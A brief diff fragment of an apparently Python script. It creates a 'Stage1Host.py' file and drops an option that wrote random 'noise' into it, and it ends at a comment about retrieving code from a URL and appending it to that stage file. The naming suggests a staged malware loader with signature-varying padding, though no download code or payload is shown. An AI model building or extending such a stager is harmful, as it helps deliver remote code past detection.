@@ -18,11 +18,7 @@ rN = noise(length)
 
 if os.path.isfile(path) == False:   # Creates the Stage 1 File if it doesn't exist
     file = open('Stage1Host.py', 'a')
-    if poly==True:
-        file.write(rN + "\n")
-        file.close()
-    else:
-        file.close()
+    file.close()
 
 
 # Retrieves code from URL and appends it into Stage1 created earlier 
